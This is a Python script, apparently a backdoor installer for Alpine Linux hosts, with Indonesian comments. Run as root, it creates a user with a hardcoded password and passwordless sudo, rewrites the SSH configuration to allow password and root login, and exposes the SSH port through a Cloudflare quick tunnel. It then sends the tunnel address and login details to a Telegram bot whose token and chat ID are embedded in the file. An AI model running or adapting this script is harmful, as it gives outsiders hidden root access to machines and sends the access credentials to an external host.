import subprocess
import time
import re
import os
import shutil
import sys
import urllib.request
import urllib.parse
import ssl

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

# Bypass SSL Verification untuk Alpine yang tidak punya CA-Certificates
ssl_ctx = ssl._create_unverified_context()

def run_cmd(cmd):
    """Menjalankan perintah shell dengan environment path lengkap."""
    try:
        my_env = os.environ.copy()
        my_env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        # Tambahkan protokol transport ke environment global command
        my_env["TUNNEL_TRANSPORT_PROTOCOL"] = "http2"
        subprocess.run(cmd, shell=True, check=True, env=my_env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def setup_alpine_ssh():
    print("[-] Menyiapkan SSH dan dependencies Alpine...")
    # libc6-compat & gcompat penting agar binary cloudflared tidak error di Alpine
    run_cmd("apk update && apk add --no-cache openssh sudo wget coreutils shadow ca-certificates libc6-compat gcompat")

    # Setup User
    run_cmd(f"userdel -r {USER_SSH} 2>/dev/null")
    run_cmd(f"adduser -D -s /bin/sh {USER_SSH}")
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # Sudoers configuration
    run_cmd("mkdir -p /etc/sudoers.d")
    with open(f"/etc/sudoers.d/{USER_SSH}", "w") as f:
        f.write(f"{USER_SSH} ALL=(ALL) NOPASSWD: ALL")
    run_cmd(f"chmod 0440 /etc/sudoers.d/{USER_SSH}")

    # SSHD Setup
    run_cmd("ssh-keygen -A")
    ssh_config = f"""
Port {SSH_PORT}
PasswordAuthentication yes
PermitRootLogin yes
TCPKeepAlive yes
ClientAliveInterval 60
Subsystem sftp /usr/lib/ssh/sftp-server
"""
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    # Restart SSHD
    run_cmd("pkill sshd")
    run_cmd("/usr/sbin/sshd")

def check_cloudflared():
    print("[-] Memeriksa Cloudflared...")
    target = "/usr/local/bin/cloudflared"
    if not shutil.which("cloudflared"):
        # Gunakan link statis amd64
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget --no-check-certificate {url} -O {target}")
        run_cmd(f"chmod +x {target}")

def start_tunnel():
    print("[-] Menjalankan Tunnel dengan Protokol HTTP2...")
    run_cmd("pkill -9 cloudflared")
    if os.path.exists(LOG_FILE): 
        try: os.remove(LOG_FILE)
        except: pass

    # Penggunaan EXPORT protokol sebelum eksekusi tunnel
    # Ini adalah kunci untuk menghindari 'websocket: bad handshake'
    cmd = (
        f"export TUNNEL_TRANSPORT_PROTOCOL=http2 && "
        f"nohup cloudflared tunnel --no-autoupdate "
        f"--url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    )
    
    # Menggunakan Popen agar proses berjalan di background
    subprocess.Popen(cmd, shell=True, env=os.environ.update({"TUNNEL_TRANSPORT_PROTOCOL": "http2"}))

    print("[*] Menunggu URL Cloudflare...")
    # Cari URL di dalam log dengan timeout 40 detik
    for _ in range(20):
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                content = f.read()
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', content)
                if match:
                    url = match.group(0)
                    print(f"[+] Berhasil! Link: {url}")
                    send_telegram(url)
                    return
        time.sleep(2)
    print("[!] Gagal mendapatkan link. Cek /tmp/cloudflared.log")

def send_telegram(url):
    clean_url = url.replace("https://", "")
    message = (
        "🏔️ **ALPINE ACCESS READY** 🏔️\n\n"
        f"👤 **User:** `{USER_SSH}`\n"
        f"🔑 **Pass:** `{PASS_SSH}`\n"
        f"🌐 **Link:** `{url}`\n\n"
        "**Command SSH:**\n"
        f"```ssh -o ProxyCommand=\"cloudflared access tcp --hostname %h\" {USER_SSH}@{clean_url}```"
    )
    
    params = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    encoded = urllib.parse.urlencode(params)
    api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?{encoded}"
    
    try:
        # Gunakan context SSL yang di-bypass (untuk Alpine minimalis)
        urllib.request.urlopen(api_url, timeout=10, context=ssl_ctx)
    except Exception as e:
        print(f"[!] Error kirim telegram: {e}")

if __name__ == "__main__":
    # Script harus jalan sebagai root
    if os.getuid() != 0:
        print("[!] Harus dijalankan sebagai root!")
        sys.exit(1)
        
    setup_alpine_ssh()
    check_cloudflared()
    start_tunnel()
